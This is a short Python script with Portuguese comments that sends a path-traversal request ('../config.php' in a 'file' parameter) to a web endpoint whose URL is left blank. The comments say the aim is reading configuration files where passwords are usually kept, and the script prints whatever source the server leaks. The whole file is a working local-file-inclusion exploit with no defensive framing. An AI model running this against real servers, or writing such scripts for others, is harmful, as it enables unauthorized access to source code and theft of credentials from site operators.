import requests

url = ""
# Lista de arquivos onde costumam esconder senhas
arquivo_alvo = "../config.php"

res = requests.get(url, params={"file": arquivo_alvo})

# Técnica de Dev: Vamos procurar qualquer coisa que pareça código PHP
# Se o servidor vazou o fonte, ele estará no meio do texto
print(f"--- CONTEÚDO BRUTO DE {arquivo_alvo} ---")
print(res.text)
print("---------------------------------------")
